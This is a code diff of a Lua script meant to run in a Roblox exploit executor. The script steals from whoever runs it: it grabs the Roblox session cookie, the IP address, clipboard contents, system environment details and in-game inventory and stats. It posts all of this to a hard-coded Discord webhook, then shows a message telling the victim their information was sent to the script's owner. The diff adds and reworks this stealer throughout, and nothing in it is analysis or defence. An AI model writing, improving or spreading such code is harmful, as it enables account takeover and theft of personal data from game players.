@@ -1,38 +1,26 @@
 -- ============================================================
--- FINAL RELIABLE VERSION – Plain text (embed skipped)
+-- FINAL WORKING SCRIPT – SENDS ALL DATA AS PLAIN TEXT
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- ========== HTTP SENDER ==========
-local function sendData(url, payload)
+-- ========== HTTP SENDER (same as test) ==========
+local function sendData(url, content)
+    local payload = {content = content}
+    local json = game:GetService("HttpService"):JSONEncode(payload)
     local headers = {["Content-Type"] = "application/json"}
     local methods = {
-        function()
-            local ok, res = pcall(function()
-                return request({Url = url, Method = "POST", Headers = headers, Body = payload})
-            end)
-            return ok
-        end,
-        function()
-            local ok, res = pcall(function()
-                return http_request({Url = url, Method = "POST", Headers = headers, Body = payload})
-            end)
-            return ok
-        end,
-        function()
-            local ok, res = pcall(function()
-                return game:GetService("HttpService"):PostAsync(url, payload, Enum.HttpContentType.ApplicationJson)
-            end)
-            return ok
-        end
+        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
+        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
+        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
     }
     for _, method in ipairs(methods) do
-        if method() then return true end
+        local ok, res = method()
+        if ok then return true end
     end
     return false
 end
 
--- ========== IP ==========
+-- ========== IP COLLECTION (multi‑service) ==========
 local function getIP()
     local ip = "N/A"
     local services = {
@@ -59,18 +47,17 @@ local function getIP()
     return ip
 end
 
--- ========== Safe Getter ==========
+-- ========== SAFE GETTER ==========
 local function safeGet(obj, prop, default)
-    local success, val = pcall(function() return obj[prop] end)
-    if success and val ~= nil then return val else return default end
+    local ok, val = pcall(function() return obj[prop] end)
+    return ok and val or default
 end
 
--- ========== COOKIE (attempt all) ==========
+-- ========== COOKIE (all attempts) ==========
 local function stealCookie()
-    local cookie = "Not found"
     local ok, val = pcall(getcookie, "https://www.roblox.com/")
     if ok and val and val ~= "" then return val end
-    ok, val = pcall(function() return getrobloxcookie() end)
+    ok, val = pcall(getrobloxcookie)
     if ok and val and val ~= "" then return val end
     ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
     if ok and val and val ~= "" then return val end
@@ -95,8 +82,8 @@ local function getSystemEnv()
     return env
 end
 
--- ========== COLLECT ==========
-local function collectEverything()
+-- ========== COLLECT EVERYTHING ==========
+local function collectAll()
     local info = {}
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
 
@@ -126,6 +113,28 @@ local function collectEverything()
                 if root then info.position = tostring(root.Position) end
             end
         end)
+        pcall(function()
+            local backpack = player:FindFirstChild("Backpack")
+            if backpack then
+                local items = {}
+                for _, item in ipairs(backpack:GetChildren()) do
+                    if item:IsA("Tool") then table.insert(items, item.Name) end
+                end
+                if #items > 0 then info.backpack = table.concat(items, ", ") end
+            end
+        end)
+        pcall(function()
+            local ls = player:FindFirstChild("leaderstats")
+            if ls then
+                local stats = {}
+                for _, stat in ipairs(ls:GetChildren()) do
+                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
+                        stats[stat.Name] = tostring(stat.Value)
+                    end
+                end
+                if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
+            end
+        end)
     end
 
     info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
@@ -133,7 +142,6 @@ local function collectEverything()
     info.gameName = safeGet(game, "Name", "Unknown")
     info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
     info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
-
     info.ip = getIP()
     info.cookie = stealCookie()
     info.clipboard = getClipboard()
@@ -166,22 +174,21 @@ local function collectEverything()
     return info
 end
 
--- ========== BUILD PLAIN TEXT MESSAGE ==========
+-- ========== BUILD MESSAGE ==========
 local function buildMessage(data)
     local lines = {}
     for k, v in pairs(data) do
         if v and v ~= "" then
-            table.insert(lines, string.format("**%s**: %s", k, tostring(v)))
+            table.insert(lines, string.format("%s: %s", k, tostring(v)))
         end
     end
-    return "```yaml\n" .. table.concat(lines, "\n") .. "\n```"
+    return "```\n" .. table.concat(lines, "\n") .. "\n```"
 end
 
--- ========== SEND DATA ==========
-local info = collectEverything()
-local message = buildMessage(info)
-local payload = '{"content": "' .. message:gsub('"', '\\"') .. '"}'
-local ok = sendData(webhook, payload)
+-- ========== EXECUTE ==========
+local data = collectAll()
+local message = buildMessage(data)
+local sent = sendData(webhook, message)
 
 -- ========== GUI ==========
 pcall(function()
@@ -202,7 +209,7 @@ pcall(function()
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
     title.BackgroundTransparency = 1
-    title.Text = "Processing..."
+    title.Text = sent and "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT" or "FAILED TO SEND"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
@@ -212,7 +219,7 @@ pcall(function()
     sub.Size = UDim2.new(1, 0, 0, 30)
     sub.Position = UDim2.new(0, 0, 0.75, 0)
     sub.BackgroundTransparency = 1
-    sub.Text = ""
+    sub.Text = sent and "Thank you for your cooperation." or "Check your webhook URL."
     sub.TextColor3 = Color3.fromRGB(200, 200, 200)
     sub.TextScaled = true
     sub.Font = Enum.Font.Gotham
@@ -229,12 +236,4 @@ pcall(function()
     closeBtn.Parent = frame
     Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 12)
     closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
-
-    if ok then
-        title.Text = "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT"
-        sub.Text = "Thank you for your cooperation."
-    else
-        title.Text = "FAILED TO SEND"
-        sub.Text = "Check your webhook URL."
-    end
 end)
